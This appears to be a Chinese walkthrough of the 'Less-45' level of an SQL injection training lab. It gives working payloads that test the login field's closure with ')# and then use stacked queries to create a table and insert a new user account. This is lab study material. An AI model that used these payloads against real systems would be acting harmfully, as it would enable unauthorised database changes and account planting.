---
title: Less - 45
date: 2023-03-22T12:33:38Z
lastmod: 2023-03-22T12:38:54Z
---

# Less - 45

---

# 通关教程

---

## 1、判断闭合

---

```http
admin# #登入失败
admin'# #登入失败
admin')# #登入成功
```

​![image](assets/image-20230322123524-ffws63q.png)​

判断闭合方式为')#，并且为字符型注入

---

## 2、创建一个表

---

```http
a');create table test like users;#
```

​![image](assets/image-20230322123645-6ccq0jz.png)​

​![image](assets/image-20230322123706-5y5eoy1.png)​

## 3、创建一个新的用户

---

```http
a');insert into users values(18,'cmx','cmx');#
```

​![image](assets/image-20230322123838-z2pln6n.png)​

​![image](assets/image-20230322123852-5c0s918.png)​

‍
